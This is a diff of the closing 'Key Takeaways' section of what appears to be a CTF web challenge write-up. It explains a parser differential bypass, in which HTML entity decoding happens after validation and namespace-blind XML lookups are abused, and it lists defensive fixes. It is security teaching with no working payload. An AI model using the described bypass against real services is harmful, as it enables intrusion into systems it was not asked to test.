+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="takeaways">Key Takeaways</h2>
+
+<p>This challenge demonstrates a classic parser differential attack. When two components process the same data using different rules, the gap between their interpretations becomes an attack surface. Security decisions made by one parser can be completely undermined by transformations applied before the second parser.</p>
+
+<p>HTML entity encoding is a <em>representation</em>, not a <em>security boundary</em>. Applying <code>html.unescape()</code> before parsing effectively nullifies any validation that was performed on the escaped form. The lesson: always validate the <strong>decoded</strong> form of input, not the encoded form.</p>
+
+<p>Using namespace-blind XML selectors like <code>find("title")</code> instead of <code>find("{http://www.w3.org/2000/svg}title")</code> allows attackers to inject elements in fake namespaces that the parser still matches. Always use fully-qualified names when processing XML from untrusted sources.</p>
+
+<div class="callout callout-warn">
+  <div class="callout-title">Defensive Recommendations</div>
+  <p>1. <strong>Validate after decoding</strong> — Never validate encoded input and then decode before use. Decode first, then validate the decoded form.<br>
+  2. <strong>Use namespace-aware parsers</strong> — Always match elements by their fully-qualified name including namespace URI.<br>
+  3. <strong>Disable entity resolution</strong> — Configure XML parsers with <code>resolve_entities=False</code> and <code>no_network=True</code>. For defense-in-depth, also strip DOCTYPE declarations server-side.<br>
+  4. <strong>Use allowlists, not denylists</strong> — Instead of blocking specific dangerous patterns (DOCTYPE, script tags), only allow known-safe structures.</p>
+</div>
+
 </main>
 </div>
 
 <footer class="site-footer">
-  <p>&copy; 2026 QA210 — TJCTF 2026 Writeups &nbsp;·&nbsp; Opening Night — Web</p>
+  <p>&copy; 2026 QA210 — TJCTF 2026 Writeups &nbsp;·&nbsp; Opening Night — Web &nbsp;·&nbsp; 3rd / 12 Solves</p>
 </footer>
 
 <script>
